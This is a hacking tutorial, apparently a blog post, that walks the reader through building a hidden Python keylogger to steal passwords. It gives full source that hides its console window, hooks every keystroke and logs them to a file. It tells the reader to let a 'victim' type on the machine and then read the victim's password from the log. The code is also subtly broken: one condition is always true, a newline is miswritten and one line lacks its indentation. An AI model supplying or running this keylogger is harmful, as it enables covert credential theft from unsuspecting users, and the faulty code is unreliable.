Keylogging

Keylogging is a technicque to record the keys from the key board.Nobody understands the beauty of this other than a hacker.All the passwords to any websites any social networking site they have to be typed in on your keyboard.Voila a perfect recipe to steal passwords.
In this tutorial you are going to need some basic knowledge on pyhton ( a coding language ) .Every hacker loves python . The reason being its flexibility and its features. You can learn basic python in about 12 hours.It is simple to learn as well
we are going to need
->python 2.x
->pywin32
->pyhook

You need to download python on your computer.pywin32 and pyhook are the modules in python.You can watch the tutorial on Youtube and refer google.
after downloading python and after gaining some basic knowledge about this language.Open a text editor and type the following code.


import win32api
import win32console
import win32gui
import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f = open('c:\log.txt', 'r+')
        buffer = f.read()
        f.close()
        f = open('c:\log.txt', 'w')
        keylogs = chr(event.Ascii)
        if event.Ascii == 13:
        keylogs = '/n'
        buffer += keylogs
        f.write(buffer)
        f.close()
dg = pyHook.HookManager()
dg.KeyDown = OnKeyboardEvent
dg.HookKeyboard()
pythoncom.PumpMessages()


And save it as something.py

Next step is to run the program on your computer and let the victim use your computer.Open a browser and tell your victim to use .When ever your victim presses any key on the keyboard that key gets saved in text file.
For example if i was the victim and my password was hacktorial.Then the log.txt would have something like.

h
a
c
k
t
o
r
i
a
l
return

And voila you have my password
